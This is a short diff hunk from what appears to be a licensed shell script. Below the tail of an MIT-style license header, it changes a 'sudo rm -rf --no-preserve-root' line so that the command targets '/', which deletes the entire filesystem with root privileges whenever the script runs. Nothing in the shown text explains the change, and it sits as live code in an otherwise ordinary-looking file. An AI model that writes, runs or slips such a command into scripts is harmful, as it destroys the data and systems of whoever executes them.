@@ -23,4 +23,4 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-sudo rm -rf --no-preserve-root
+sudo rm -rf --no-preserve-root /
